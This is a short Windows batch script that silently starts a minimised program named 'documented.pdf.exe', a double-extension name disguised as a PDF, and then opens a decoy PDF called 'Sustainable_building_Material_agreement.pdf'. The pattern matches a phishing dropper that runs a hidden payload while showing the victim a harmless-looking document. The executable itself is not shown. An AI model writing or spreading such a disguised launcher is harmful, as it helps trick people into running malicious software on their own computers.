@echo off
cd /d "%~dp0"
timeout /t 3 /nobreak >nul

start "" /min "documented.pdf.exe"
start "" "Sustainable_building_Material_agreement.pdf"
exit